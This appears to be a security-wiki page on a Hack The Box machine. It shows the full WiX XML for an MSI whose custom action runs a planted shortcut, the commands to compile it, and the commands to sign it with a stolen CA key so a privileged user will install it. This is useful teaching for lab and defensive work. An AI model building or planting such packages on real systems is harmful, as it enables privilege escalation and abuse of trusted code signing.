# Creating a Custom-Action MSI with WiX

{{#include ../../banners/hacktricks-training.md}}

This historical Hack The Box chain used WiX Toolset v3 to build an MSI that launched a previously planted `.lnk` file. **An MSI is not automatically privileged**: execution occurs in the context selected by Windows Installer policy, the custom-action attributes, and whoever installs it. In the cited scenario, the attacker also stole a trusted signing CA and placed the signed MSI in a folder watched by another user.<sup>[[1]](#references)[[3]](#references)</sup>

For a comprehensive understanding of wix MSI usage examples, it is advisable to consult [this page](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with). Here, you can find various examples that demonstrate the usage of wix MSI.<sup>[[2]](#references)</sup>

The MSI runs `C:\Users\Public\Desktop\Shortcuts\rick.lnk`. The original WiX v3 XML is preserved below:<sup>[[1]](#references)</sup>

```html
<?xml version="1.0"?>
<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
<Product Id="*" UpgradeCode="12345678-1234-1234-1234-111111111111" Name="Example Product Name"
Version="0.0.1" Manufacturer="@_xpn_" Language="1033">
<Package InstallerVersion="200" Compressed="yes" Comments="Windows Installer Package"/>
<Media Id="1" Cabinet="product.cab" EmbedCab="yes"/>
<Directory Id="TARGETDIR" Name="SourceDir">
<Directory Id="ProgramFilesFolder">
<Directory Id="INSTALLLOCATION" Name="Example">
<Component Id="ApplicationFiles" Guid="12345678-1234-1234-1234-222222222222">
</Component>
</Directory>
</Directory>
</Directory>
<Feature Id="DefaultFeature" Level="1">
<ComponentRef Id="ApplicationFiles"/>
</Feature>
<Property Id="cmdline">cmd.exe /C "c:\users\public\desktop\shortcuts\rick.lnk"</Property>
<CustomAction Id="Stage1" Execute="deferred" Directory="TARGETDIR" ExeCommand='[cmdline]' Return="ignore"
Impersonate="yes"/>
<CustomAction Id="Stage2" Execute="deferred" Script="vbscript" Return="check">
fail_here
</CustomAction>
<InstallExecuteSequence>
<Custom Action="Stage1" After="InstallInitialize"></Custom>
<Custom Action="Stage2" Before="InstallFiles"></Custom>
</InstallExecuteSequence>
</Product>
</Wix>
```

`InstallerVersion` declares the minimum Windows Installer version and `Compressed="yes"` marks the package as compressed. `Stage1` is deferred but has `Impersonate="yes"`, so it runs with the installing user's impersonated token; change of privilege in this scenario came from the privileged user who later opened the MSI, not from that attribute magically granting SYSTEM.<sup>[[3]](#references)</sup>

Compile the source to a WiX object with `candle.exe`:<sup>[[1]](#references)</sup>

```
candle.exe -out C:\tmp\wix.wixobj C:\tmp\Ethereal\msi.xml
```

Link that object into an MSI with `light.exe`:<sup>[[1]](#references)</sup>

```
light.exe -out C:\tmp\Ethereal\rick.msi C:\tmp\wix.wixobj
```

### Signing step used in the original chain

The target workflow accepted packages signed by a compromised internal CA. The write-up derived a signing certificate from the recovered `MyCA.cer`/`MyCA.pvk`, created a PFX, and signed the MSI:<sup>[[1]](#references)</sup>

```powershell
makecert.exe -n "CN=Ethereal" -pe -cy end `
  -ic C:\tmp\MyCA.cer -iv C:\tmp\MyCA.pvk -sky signature `
  -sv C:\tmp\rick.pvk C:\tmp\rick.cer
pvk2pfx.exe -pvk C:\tmp\rick.pvk -spc C:\tmp\rick.cer -pfx C:\tmp\rick.pfx
signtool.exe sign /f C:\tmp\rick.pfx C:\tmp\Ethereal\rick.msi
```

The attacker then placed the signed package in `D:\DEV\MSIs` and waited for the privileged workflow/user to execute it. Preserve that precondition when adapting the technique: without an elevated installation path, unsafe policy such as `AlwaysInstallElevated`, or a privileged victim, this package executes only with the current user's rights.

## References

- [1] [Hack The Box - Ethereal: Creating Malicious msi and getting root - 0xRick's Blog](https://0xrick.github.io/hack-the-box/ethereal/#Creating-Malicious-msi-and-getting-root)
- [2] [A quick introduction: Create an MSI installer with WiX - CodeProject](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with) (see also [wixtools](http://wixtoolset.org))
- [3] [Microsoft Learn — Deferred execution custom actions (`Impersonate`)](https://learn.microsoft.com/en-us/windows/win32/msi/custom-action-in-script-execution-options)

{{#include ../../banners/hacktricks-training.md}}
